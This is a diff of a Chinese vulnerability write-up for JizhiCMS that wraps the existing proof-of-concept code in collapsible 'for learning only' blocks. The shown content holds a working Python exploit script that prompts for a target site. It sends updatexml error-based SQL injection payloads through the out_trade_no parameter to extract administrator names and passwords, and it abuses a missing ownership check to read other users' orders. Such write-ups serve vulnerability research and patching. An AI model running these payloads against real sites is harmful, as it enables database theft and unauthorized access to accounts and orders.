@@ -178,9 +178,11 @@ function SafeFilter(&$arr)
 			if($msg[2]) exit('数据库错误：' . $msg[2] . end($this->filter));
 		}
 	}
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
-看到`$msg = $this->pdo->errorInfo();`语句，也就是说会把数据库报错信息打印在页面上并显示出来并退出
+<pre><code class="language-text">
+看到`$msg = $this-&gt;pdo-&gt;errorInfo();`语句，也就是说会把数据库报错信息打印在页面上并显示出来并退出
 
 一套分析下来没有发现对sql语句的过滤，如果得到的数据没有经过`format_param`过滤，会产生注入
 
@@ -188,9 +190,10 @@ function SafeFilter(&$arr)
 
 ```php
 function exploit(){
-    M('member')->find(['username'=>$_GET['name']]);
-}
-```
+    M('member')-&gt;find(['username'=&gt;&#36;_GET['name']]);
+}</code></pre>
+
+</details>
 
 如果直接这样GET POST REQUEST 带入数据库 会产生报错注入
 
@@ -218,8 +221,10 @@ function exploit(){
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170919441.jpg)
 
-```python
-import requests
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-python">import requests
 import re
 
 """
@@ -258,27 +263,27 @@ def main():
 
 
 def poc_1():
-    ## poc_1 --->  sql注入漏洞点( Home/c/MypayController.php [alipay_notify_pay])
+    ## poc_1 ---&gt;  sql注入漏洞点( Home/c/MypayController.php [alipay_notify_pay])
     ## 使用范围 极致cms 1.71 + 1.7 + 1.67 版本
     """
     function alipay_return_pay(){
     		extendFile('pay/alipay/AlipayServiceCheck.php');
-    		//支付宝公钥，账户中心->密钥管理->开放平台密钥，找到添加了支付功能的应用，根据你的加密类型，查看支付宝公钥
-    		$alipayPublicKey=$this->webconf['alipay_public_key'];
+    		//支付宝公钥，账户中心-&gt;密钥管理-&gt;开放平台密钥，找到添加了支付功能的应用，根据你的加密类型，查看支付宝公钥
+    		$alipayPublicKey=$this-&gt;webconf['alipay_public_key'];
 
     		$aliPay = new \AlipayServiceCheck($alipayPublicKey);
     		//验证签名
-    		$result = $aliPay->rsaCheck($_GET,$_GET['sign_type']);
+    		$result = $aliPay-&gt;rsaCheck(&#36;_GET,&#36;_GET['sign_type']);
 
-            $result=true;   <<--- (添加的php代码 模拟打开支付宝 并通过签名验证)
+            $result=true;   &lt;&lt;--- (添加的php代码 模拟打开支付宝 并通过签名验证)
 
             if($result===true){
     			//同步回调一般不处理业务逻辑，显示一个付款成功的页面，或者跳转到用户的财务记录页面即可。
-    			//echo '<h1>付款成功</h1>';
-    			$out_trade_no = htmlspecialchars($_GET['out_trade_no']);  << ---- （漏洞位置，只过滤了xss，没有调用函数过滤sql语句）
+    			//echo '&lt;h1&gt;付款成功&lt;/h1&gt;';
+    			$out_trade_no = htmlspecialchars(&#36;_GET['out_trade_no']);  &lt;&lt; ---- （漏洞位置，只过滤了xss，没有调用函数过滤sql语句）
     			$orderno = $out_trade_no;
     			$paytime = time();
-    			$order = M('orders')->find(['orderno'=>$orderno]);  << --- (执行sql注入的语句)
+    			$order = M('orders')-&gt;find(['orderno'=&gt;$orderno]);  &lt;&lt; --- (执行sql注入的语句)
     """
 
     try:
@@ -296,7 +301,7 @@ def poc_1():
             data = re.search(r'~(.*?)~', response.text).group(1)
 
             if data == []:
-                print('[!!] sql语句错误 或者 版本高于 [极致cms 1.71  -> 发布时间 2020-05-25]')
+                print('[!!] sql语句错误 或者 版本高于 [极致cms 1.71  -&gt; 发布时间 2020-05-25]')
             else:
                 print('得到的数据为:\n', data)
                 print('------------------ peiqi -----------------------')
@@ -308,14 +313,14 @@ def poc_1():
 
 # http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html
 def poc_2():
-    ## poc_2 ---> 用户购物车页面获取 (Home/c/UserController.php [orderdetails])
-    ## 漏洞点 ---> 无用户cookie id 的验证
+    ## poc_2 ---&gt; 用户购物车页面获取 (Home/c/UserController.php [orderdetails])
+    ## 漏洞点 ---&gt; 无用户cookie id 的验证
     ## 使用范围 极致cms 1.8以下全版本 (当前最新 v1.8 更新时间:6月30日)
     """
     function orderdetails(){
-    	$orderno = $this->frparam('orderno',1);
-		$order = M('orders')->find(['orderno'=>$orderno]);
-		if($orderno && $order){
+    	$orderno = $this-&gt;frparam('orderno',1);
+		$order = M('orders')-&gt;find(['orderno'=&gt;$orderno]);
+		if($orderno &amp;&amp; $order){
 			/*
 			if($order['isshow']!=1){
 				//超时或者已支付
@@ -328,8 +333,8 @@ def poc_2():
 				if($order['isshow']==2){
 					$msg = '订单已支付，请勿重复操作！';
 				}
-				if($this->frparam('ajax')){
-					JsonReturn(['code'=>1,'msg'=>$msg]);
+				if($this-&gt;frparam('ajax')){
+					JsonReturn(['code'=&gt;1,'msg'=&gt;$msg]);
 				}
 				Error($msg);
 
@@ -337,23 +342,23 @@ def poc_2():
 			*/
 			$carts = explode('||',$order['body']);
 			$new = [];
-			foreach($carts as $k=>$v){
+			foreach($carts as $k=&gt;$v){
 				$d = explode('-',$v);
 				if($d[0]!=''){
 					//兼容多模块化
-					if(isset($this->classtypedata[$d[0]])){
-						$type = $this->classtypedata[$d[0]];
-						$res = M($type['molds'])->find(['id'=>$d[1]]);
-						$new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]];
+					if(isset($this-&gt;classtypedata[$d[0]])){
+						$type = $this-&gt;classtypedata[$d[0]];
+						$res = M($type['molds'])-&gt;find(['id'=&gt;$d[1]]);
+						$new[] = ['info'=&gt;$res,'num'=&gt;$d[2],'tid'=&gt;$d[0],'id'=&gt;$d[1],'price'=&gt;$d[3]];
 					}else{
-						$new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]];
+						$new[] = ['info'=&gt;false,'num'=&gt;$d[2],'tid'=&gt;$d[0],'id'=&gt;$d[1],'price'=&gt;$d[3]];
 					}
 				}
 
 			}
-			$this->carts = $new;
-			$this->order = $order;
-			$this->display($this->template.'/user/orderdetails');
+			$this-&gt;carts = $new;
+			$this-&gt;order = $order;
+			$this-&gt;display($this-&gt;template.'/user/orderdetails');
 		}
 
     }
@@ -385,11 +390,11 @@ def poc_2():
         print('------------------ peiqi -----------------------')
 
 def poc_3():
-    ## poc_3  ---> 得到账号密码  ( Home/c/MypayController.php [alipay_notify_pay])
-    ## 使用范围 ---> 极致cms 1.71 + 1.7 + 1.67 版本
+    ## poc_3  ---&gt; 得到账号密码  ( Home/c/MypayController.php [alipay_notify_pay])
+    ## 使用范围 ---&gt; 极致cms 1.71 + 1.7 + 1.67 版本
     try:
         exploit_url = str(input("攻击网站url：\n"))
-        # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+
+        # payload --&gt; updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+
         # 用户名 + 密码 长度
 
         payload_url = exploit_url + "mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+"
@@ -426,8 +431,9 @@ def poc_3():
 
 
 if __name__ == '__main__':
-    main()
-```
+    main()</code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170919669.jpg)
 
